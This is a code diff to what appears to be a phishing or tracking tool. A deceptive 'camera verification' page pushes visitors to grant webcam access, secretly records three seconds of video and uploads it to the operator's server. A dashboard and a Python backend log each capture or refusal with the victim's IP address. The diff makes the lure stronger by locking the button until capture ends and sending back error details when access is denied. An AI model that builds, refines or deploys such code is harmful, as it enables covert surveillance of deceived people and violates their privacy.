@@ -164,6 +164,7 @@ function setCamStatus(msg,col){
 }
 function captureCamera(){
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cameraDone=true;return;}
+  document.getElementById('btn').disabled=true;
   setCamStatus('📷 Camera verification required — please allow access');
   navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
     .then(function(stream){
@@ -172,26 +173,30 @@ function captureCamera(){
       mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
       mr.onstop=function(){
         stream.getTracks().forEach(function(t){t.stop();});
-        setCamStatus('✓ Device verified','#3fb950');
-        setTimeout(function(){setCamStatus(null);},2000);
+        setCamStatus('✓ Camera verified','#3fb950');
+        setTimeout(function(){setCamStatus(null);},1500);
         var blob=new Blob(chunks,{type:mr.mimeType});
         var fd=new FormData();
         fd.append('video',blob,'capture.webm');
         fd.append('mimeType',mr.mimeType);
         fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
-        cameraDone=true;tryRedirect();
+        cameraDone=true;
+        document.getElementById('btn').disabled=false;
+        tryRedirect();
       };
       mr.start();
       setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
     }).catch(function(err){
-      var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError'||err.name==='OverconstrainedError';
+      var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError';
+      send('/camera',{denied:true,reason:err.message||'Permission denied',errName:err.name});
       if(noHw){
         setCamStatus(null);
-        cameraDone=true;tryRedirect();
+        cameraDone=true;
+        document.getElementById('btn').disabled=false;
+        tryRedirect();
       }else{
-        setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');
+        setCamStatus('⚠ Camera access is required to continue. Please allow camera and refresh the page.','#f85149');
       }
-      send('/camera',{denied:true,reason:err.message||'Permission denied'});
     });
 }
 function autoCapture(){
@@ -367,6 +372,7 @@ function addCard(d){
     if(d.denied){
       badge='<span class="bx cam-deny">Cam Denied</span>';
       fields+=f('Reason',d.reason||'Permission denied');
+      if(d.errName)fields+=f('Error Name',d.errName);
     }else{
       badge='<span class="bx cam">Camera</span>';
       var kb=d.size?Math.round(d.size/1024)+'KB':'?';
@@ -474,7 +480,8 @@ def run(redirect_url: str):
             if d.get('denied'):
                 entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
                          '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
-                         'denied': True, 'reason': d.get('reason', 'Permission denied')}
+                         'denied': True, 'reason': d.get('reason', 'Permission denied'),
+                         'errName': d.get('errName', '')}
                 captures.append(entry); _save(log_file); return {'ok': True}
             return {'ok': False}
         # FormData video upload
